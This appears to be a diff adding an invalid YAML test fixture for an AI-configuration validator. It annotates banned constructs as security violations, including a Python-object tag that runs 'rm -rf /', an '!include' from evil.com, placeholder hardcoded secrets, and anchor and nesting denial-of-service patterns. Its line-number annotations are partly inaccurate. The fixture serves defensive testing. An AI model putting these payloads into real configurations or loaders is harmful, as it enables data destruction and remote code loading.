@@ -1,0 +1,126 @@
+# INVALID: Security Violations
+# This configuration demonstrates security issues that CAYP prevents
+
+cayp_version: "1.0"
+name: "insecure-config"
+description: "Configuration with security violations"
+created: "2025-11-08"
+
+models:
+  primary:
+    provider: "anthropic"
+    model: "claude-sonnet-4"
+    parameters:
+      max_tokens: 4096
+
+# ❌ ERROR: Anchors and Aliases (DoS Attack Vector)
+# Anchors can be used for billion laughs attack
+common_settings: &defaults    # WRONG: Anchor definition
+  timeout: 30
+  retry: 3
+  
+deployment:
+  dev:
+    <<: *defaults             # WRONG: Alias usage
+    environment: "dev"
+    
+  prod:
+    <<: *defaults             # WRONG: Merge key
+    environment: "prod"
+
+# ✅ CORRECT: Explicit duplication (verbose but safe)
+# deployment:
+#   dev:
+#     timeout: 30
+#     retry: 3
+#     environment: "dev"
+#   prod:
+#     timeout: 30
+#     retry: 3
+#     environment: "prod"
+
+# ❌ ERROR: Hardcoded Secrets
+# Secrets must never be in configuration files
+authentication:
+  api_key: "sk-1234567890abcdef"        # WRONG: Hardcoded secret
+  database_password: "MyP@ssw0rd123"    # WRONG: Hardcoded secret
+  jwt_secret: "supersecretkey"          # WRONG: Hardcoded secret
+  
+# ✅ CORRECT: Reference environment variables or secrets manager
+# authentication:
+#   api_key_env: "OPENAI_API_KEY"
+#   database_password_env: "DB_PASSWORD"
+#   jwt_secret_env: "JWT_SECRET"
+
+# ❌ ERROR: Custom YAML Tags (Code Execution Vector)
+# Custom tags can execute arbitrary code
+dangerous:
+  exploit: !!python/object/apply:os.system   # WRONG: Custom tag
+    - "rm -rf /"
+    
+# ✅ CORRECT: Only standard types allowed
+# No custom tags permitted in CAYP
+
+# ❌ ERROR: External References (SSRF Vector)
+# External includes can be exploited
+config:
+  import: !include http://evil.com/config.yaml  # WRONG: External reference
+  
+# ✅ CORRECT: Self-contained configuration
+# No external references allowed
+
+# ❌ ERROR: Missing Safety Configuration
+# Safety section is REQUIRED in CAYP
+# This file is missing the mandatory safety section
+
+# ✅ CORRECT: Always include safety section
+# safety:
+#   content_filtering:
+#     enabled: true
+#     action: "block"
+#   audit:
+#     log_level: "info"
+
+# ❌ ERROR: Excessive Nesting (DoS Vector)
+# Deep nesting can cause parser exhaustion
+deep_nest:
+  level1:
+    level2:
+      level3:
+        level4:
+          level5:
+            level6:
+              level7:
+                level8:
+                  level9:
+                    level10:
+                      level11:
+                        level12:
+                          level13:
+                            level14:
+                              level15:
+                                level16:
+                                  level17:
+                                    level18:
+                                      level19:
+                                        level20:
+                                          level21:  # WRONG: Exceeds max depth of 20
+                                            value: "too deep"
+
+# VALIDATION ERRORS THIS FILE PRODUCES:
+# Line 15: Anchor '&defaults' not allowed - security risk
+# Line 19: Alias '*defaults' not allowed - security risk
+# Line 23: Merge key '<<' not allowed - security risk
+# Line 40: Hardcoded secret detected - use environment variable
+# Line 41: Hardcoded secret detected - use environment variable
+# Line 42: Hardcoded secret detected - use environment variable
+# Line 51: Custom tag '!!python/object/apply' not allowed
+# Line 56: External reference '!include' not allowed - SSRF risk
+# Line 62: Missing required 'safety' section
+# Line 71: Nesting depth exceeds maximum of 20 levels
+
+# ❌ ERROR: Excessively Large Strings (Memory Exhaustion)
+large_string: "A" * 10000000  # WRONG: Exceeds max string length
+
+# ADDITIONAL VALIDATION ERROR:
+# Line 87: String exceeds maximum length of 1MB
